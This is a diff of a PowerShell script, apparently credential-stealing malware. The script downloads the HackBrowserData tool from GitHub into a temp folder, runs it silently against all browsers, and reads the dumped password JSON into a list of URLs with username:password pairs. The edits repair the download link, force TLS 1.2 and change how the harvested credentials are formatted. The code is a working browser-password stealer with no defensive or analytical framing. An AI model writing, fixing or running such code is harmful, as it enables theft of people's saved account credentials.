@@ -23,19 +23,21 @@ New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
 try {
     # Download HackBrowserData
-    $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-v0.4.6-windows-64bit.zip"
+    $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
     $zipPath = "$tempDir\hbd.zip"
     
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri $hbdUrl -OutFile $zipPath -UseBasicParsing
     
     # Extract
-    Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)
     
     # Run HackBrowserData
-    $exePath = Get-ChildItem -Path $tempDir -Filter "*.exe" -Recurse | Select-Object -First 1
-    if($exePath) {
-        & $exePath.FullName --output-dir $tempDir --format json | Out-Null
-        Start-Sleep -Seconds 2
+    $exePath = "$tempDir\hack-browser-data.exe"
+    if(Test-Path $exePath) {
+        & $exePath -b all -f json --dir $tempDir | Out-Null
+        Start-Sleep -Seconds 3
         
         # Read the password file
         $jsonFile = Get-ChildItem -Path $tempDir -Filter "*password*.json" -Recurse | Select-Object -First 1
@@ -43,7 +45,7 @@ try {
             $data = Get-Content $jsonFile.FullName | ConvertFrom-Json
             $browsers = ""
             foreach($item in $data) {
-                $browsers += "$($item.url)`n  User: $($item.username)`n  Pass: $($item.password)`n`n"
+                $browsers += "$($item.url)`n$($item.username):$($item.password)`n`n"
             }
             if(-not $browsers) { $browsers = "No saved browser passwords found" }
         } else {
